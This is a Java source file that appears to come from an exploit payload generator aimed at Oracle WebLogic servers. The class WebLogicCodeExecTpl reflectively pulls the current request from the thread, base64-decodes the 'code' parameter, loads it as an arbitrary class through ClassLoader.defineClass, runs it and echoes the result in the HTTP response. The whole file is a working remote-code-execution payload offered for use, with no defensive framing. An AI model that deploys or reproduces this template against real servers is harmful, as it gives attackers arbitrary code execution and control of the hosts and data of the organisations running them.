package jeg.core.template.weblogic;

import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;


public class WebLogicCodeExecTpl {
    private String getReqParamName() {
        return "code";
    }

    public WebLogicCodeExecTpl() {
        run();
    }

    private  void run() {
        String code = null;
        Thread thread = Thread.currentThread();
        Object target = null;
        PrintWriter writer = null;
        try {
            target = invokeMethod(thread, "getCurrentWork", new Class[0], new Object[0]);
            code = (String) invokeMethod(target, "getParameter", new Class[]{String.class}, new Object[]{getReqParamName()});
            Object response = invokeMethod(target, "getResponse", new Class[0], new Object[0]);
            writer = (PrintWriter) invokeMethod(response, "getWriter", new Class[0], new Object[0]);
        } catch (Exception e) {
            try {
                Object connectionHandler = getFV(target, "connectionHandler");
                Object request = invokeMethod(connectionHandler, "getServletRequest", new Class[0], new Object[0]);
                if (code == null) {
                    code = (String) invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{getReqParamName()});
                }
                Object response = invokeMethod(connectionHandler, "getServletResponse", new Class[0], new Object[0]);
                writer = (PrintWriter) invokeMethod(response, "getWriter", new Class[0], new Object[0]);
            } catch (Exception ignored) {
            }
        }
        // define class
        String execRes = exec(code);
        // 回显执行结果
        writer.write(execRes);
        writer.flush();
        writer.close();
    }

    private  String exec(String var2) {
        try {
            byte[] clazzByte = base64Decode(var2);
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), clazzByte, 0, clazzByte.length);
            return clazz.newInstance().toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    private  byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var4) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }

    private  synchronized Object getFV(final Object o, final String s) throws Exception {
        Field declaredField = null;
        Class<?> clazz = o.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(s);
                break;
            } catch (NoSuchFieldException ex) {
                clazz = clazz.getSuperclass();
            }
        }
        if (declaredField == null) {
            throw new NoSuchFieldException(s);
        }
        declaredField.setAccessible(true);
        return declaredField.get(o);
    }


    private  synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Method method = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                method = clazz.getDeclaredMethod(methodName, paramClazz);
                break;
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj, param);
    }
}
